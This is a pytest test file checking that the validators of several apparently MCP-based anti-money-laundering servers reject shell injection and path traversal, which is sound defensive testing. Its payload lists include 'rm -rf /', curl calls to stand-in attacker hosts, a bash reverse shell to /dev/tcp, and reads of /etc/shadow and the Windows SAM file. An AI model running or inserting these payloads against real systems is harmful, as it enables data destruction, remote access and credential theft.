"""Automated Test Suite: Shell & Subprocess Execution Defense.

Validates:
- Strict prevention of OS command injection and subprocess spawning.
- Rejection of shell metacharacters (;, |, &, $, `, $(), >, <).
- Prevention of binary invocations (powershell, cmd, bash, curl, wget).
- Path traversal prevention (../, ..\\).
"""

import pytest
from mcp_servers.common.security import validate_safe_identifier, validate_safe_query
from mcp_servers.common.errors import SecurityValidationError
from mcp_servers.transaction_server.tools import get_transaction
from mcp_servers.graph_server.tools import get_account_neighbors
from mcp_servers.risk_server.tools import get_risk_score
from mcp_servers.knowledge_server.tools import search_knowledge


@pytest.mark.parametrize(
    "attack_payload",
    [
        "TXN-001; rm -rf /",
        "TXN-001 | powershell.exe -Command 'Get-Process'",
        "TXN-001 && cmd.exe /c whoami",
        "TXN-001 $(curl http://attacker.com/leak)",
        "TXN-001 `cat /etc/passwd`",
        "TXN-001; bash -c 'id'",
        "TXN-001 > /tmp/hacked.txt",
        "../../../../etc/shadow",
        "..\\..\\..\\windows\\system32\\config\\SAM",
        "TXN-001; python -c 'import os; os.system(\"calc\")'",
        "TXN-001; eval(malicious_code)",
    ],
)
def test_validate_safe_identifier_rejects_shell_injections(attack_payload: str):
    """Verify identifier validator blocks all shell injection and command execution attempts."""
    with pytest.raises(SecurityValidationError) as exc_info:
        validate_safe_identifier(attack_payload, "identifier")

    payload = exc_info.value.payload
    assert payload["error"] == "SECURITY_VIOLATION"
    assert "recovery" in payload


@pytest.mark.parametrize(
    "attack_query",
    [
        "money laundering $(curl http://evil.com/payload)",
        "aml typologies | powershell -enc ZWNobyBoYWNrZWQ=",
        "regulations; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "fatf guidance `whoami`",
    ],
)
def test_validate_safe_query_rejects_shell_injections(attack_query: str):
    """Verify search query validator blocks command injection while allowing AML terms."""
    with pytest.raises(SecurityValidationError) as exc_info:
        validate_safe_query(attack_query, "query")

    payload = exc_info.value.payload
    assert payload["error"] == "SECURITY_VIOLATION"


@pytest.mark.asyncio
async def test_tools_intercept_shell_execution_across_servers():
    """Verify all servers intercept shell attacks and return structured security errors."""
    attack = "ID-001 | powershell.exe -Command 'calc'"

    res_txn = await get_transaction(attack)
    assert res_txn["error"] == "SECURITY_VIOLATION"

    res_graph = await get_account_neighbors(attack)
    assert res_graph["error"] == "SECURITY_VIOLATION"

    res_risk = await get_risk_score(attack)
    assert res_risk["error"] == "SECURITY_VIOLATION"

    res_know = await search_knowledge("test $(whoami)")
    assert res_know["error"] == "SECURITY_VIOLATION"

